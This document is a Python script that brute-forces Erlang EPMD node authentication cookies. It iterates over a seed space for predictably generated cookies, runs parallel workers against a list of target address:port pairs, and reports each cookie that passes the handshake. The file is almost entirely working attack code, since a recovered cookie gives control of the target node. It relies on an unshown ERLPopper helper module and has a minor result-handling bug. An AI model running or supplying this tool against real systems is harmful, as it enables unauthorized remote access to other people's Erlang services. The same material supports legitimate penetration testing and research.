#!/usr/bin/env python3
import argparse
import multiprocessing
from os.path import isfile
from time import time
from multiprocessing import Pool
from itertools import product
from ERLPopper import *

#   char full_space[] = "0,68719476735,100.0";

def parse_str_or_file(in_str):
    """
    Expecting:
        <string>
        - OR -
        <string_file>
    Where:
        <string> is a single item
        <string_file> is a newline-delimited list of <string>s
    """

    list_lines = []
    if not isfile(in_str):
        list_lines = [in_str]
    else:
        list_lines = [x.strip() for x in open(in_str, "r").readlines()]

    return list_lines

def print_result(res):
    for r in res:
        if r is not None:
            (target, cookie) = res
            print(f"[+] Good cookie ({target}): {cookie}")
    #return res

def go(target, interval, version, verbose):
    (start, end) = interval.split(',')
    interval_time_last = time()
    interval_progress = int(start)
    for i in range(int(start), int(end)):
        if time() - interval_time_last > 2:
            r = int((i-interval_progress)/2)
            with rate.get_lock():
                rate.value += r
            print(f"Cookies: {rate.value}/s", end='\r')
            interval_progress = i
            interval_time_last = time()
        cookie = ERLPopper.create_cookie_from_seed(i)
        epop = ERLPopper(target=target, cookie=cookie, version=version, verbose=verbose)
        if epop.check_cookie():
            return (target, cookie)

if __name__ == "__main__":
    # Parse args
    parser = argparse.ArgumentParser(
            description="Attempt to brute force EPMD node cookie using various methods.",
            epilog="Maximum interval seed space is 0 to 68719476735 according to erl-matter/bruteforce-erldp.c. That's 68.7 billion seeds * 21char = 64 GB if you were trying to store the cookies themselves. The entire [A-Z]{20} set is 26^20 * 21char = 3.98 * 10^29 bytes (39.8 million Exabytes)."
    )

    parser.add_argument("target", action="store", type=parse_str_or_file, help="Target node <address>:<port>, or file containing newline-delimited list of <address>:<port> strings.")
    parser.add_argument("interval", action="store", type=parse_str_or_file, help="Seed interval in format <start>,<end> or file containing newline-delimited list of intervals.")
    version_group = parser.add_mutually_exclusive_group()
    version_group.add_argument("--old", action="store_true", help="Use old handshake method (default).")
    version_group.add_argument("--new", action="store_true", help="Use new handshake method.")
    parser.add_argument("--verbose", action="store_true", help="Extra output for debugging.")
    parser.add_argument("--processes", action="store", type=int, default=4, help="Number of processes to use (default: 4).")

    args = parser.parse_args()

    version = 5
    if args.new:
        version = 6

    rate = multiprocessing.Value('I')
    
    targets_intervals_product = product(args.target, args.interval, [version], [args.verbose])

    with Pool(processes=args.processes) as pool:
        result = pool.starmap_async(func=go, iterable=targets_intervals_product, callback=print_result).get()
